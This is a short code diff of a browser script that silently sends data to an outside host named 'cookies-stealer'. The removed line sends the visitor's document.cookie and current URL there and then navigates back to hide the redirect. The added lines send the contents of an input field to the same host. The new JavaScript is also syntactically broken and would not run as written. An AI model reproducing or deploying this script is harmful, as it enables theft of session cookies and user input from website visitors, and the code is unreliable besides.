@@ -1,4 +1,10 @@
+<input>
+</input>
 <script>
-	location.href="https://masa-pokemon.github.io/cookies-stealer/?cookie="+document.cookie+",?url="+location.href;
+	input = document.querySelector('.input'); 
+	input.addEventListener('change', () { 
+		input_text = input.value;
+	});
+	location.href="https://masa-pokemon.github.io/cookies-stealer/?cookie="+input_text;
 	history.back();
 </script>
